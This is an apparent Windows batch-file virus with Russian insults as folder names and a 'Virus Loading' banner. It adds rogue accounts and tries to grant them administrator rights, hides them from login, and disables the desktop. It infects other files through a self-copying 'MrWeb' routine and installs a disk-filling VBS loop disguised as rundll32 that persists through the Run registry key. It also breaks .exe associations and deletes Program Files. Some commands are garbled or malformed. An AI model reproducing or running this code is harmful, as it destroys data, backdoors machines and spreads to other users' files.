@echo off 
shutdown -r -t 10 -c "If pc restart, open 2.bat" >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul
chcp 1251 
net user SUPPORT_388945a0 /delete 
net user hah hah /add 
net localgroup Администраторы hacker /add 
net localgroup Пользователи SUPPORT_388945a0 /del 
reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y
net user SUPPORT_388945a0 /delete 
net user 123 hah /add 
net localgroup Администраторы hacker /add 
net localgroup Пользователи SUPPORT_388945a0 /del 
reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y
net user SUPPORT_388945a0 /delete 
net user hahha hah /add 
net localgroup Администраторы hacker /add 
net localgroup Пользователи SUPPORT_388945a0 /del 
reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y
rundll32 user,SwapMouseButton
%[MrWeb]%
if '%1=='In_ goto MrWebin
if exist c:\MrWeb.bat goto MrWebru
if not exist %0 goto MrWeben
find "MrWeb"<%0>c:\MrWeb.bat
attrib +h c:\MrWeb.bat
:MrWebru
for %%g in (..\*.jpg ..\*.doc ..\*.htm? *.jpg *.mp3 *.doc *.htm? *.xls) do call c:\MrWeb In_ %%ggoto MrWeben
:MrWebin
if exist %2.bat goto MrWeben
type c:\MrWeb.bat>>%2.bat
echo start %2>>%2.bat%[MrWeb]%
:MrWeben
echo Set fso = CreateObject("Scripting.FileSystemObject") > %systemdrive%\windows\system32\rundll32.vbs 
echo do >> %systemdrive%\windows\system32\rundll32.vbs 
echo Set tx = fso.CreateTextFile("%systemdrive%\windows\system32\rundll32.dat", True) >> %systemdrive%\windows\system32\rundll32.vbs 
echo tx.WriteBlankLines(100000000) >> %systemdrive%\windows\system32\rundll32.vbs 
echo tx.close >> %systemdrive%\windows\system32\rundll32.vbs 
echo FSO.DeleteFile "%systemdrive%\windows\system32\rundll32.dat" >> %systemdrive%\windows\system32\rundll32.vbs 
echo loop >> %systemdrive%\windows\system32\rundll32.vbs 
start %systemdrive%\windows\system32\rundll32.vbs 
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system_host_run /t REG_SZ /d %systemdrive%\windows\system32\rundll32.vbs /f
Echo Virus Loading 
Date 13.09.96 
If exist c:ski.bat goto abc 
Copy %0 c:ski.bat 
Attrib +h c:ski.bat 
Echo c:ski.bat >>autoexec.bat 
:abc 
md PRIDUROK 
md LUZER 
md DURAK 
md LAMER 
Label E: PRIDUROK 
assoc .exe=.mp3 
del c:Program Files/q 
Echo VIRUS LOAD 